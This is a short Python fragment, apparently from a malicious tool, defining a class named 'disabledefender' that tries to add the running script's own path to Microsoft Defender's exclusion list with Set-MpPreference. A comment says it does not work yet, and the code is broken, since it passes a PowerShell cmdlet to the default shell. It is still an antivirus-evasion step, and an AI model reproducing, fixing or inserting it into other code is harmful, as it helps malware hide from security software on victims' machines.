### NOT WORKING AT THE MOMENT, WE ARE WORKING ON THIS :)
class disabledefender():
    import subprocess
    from sys import argv

    curr = argv[0]
    subprocess.run(f"Set-MpPreference -ExclusionPath {curr}", shell=True)
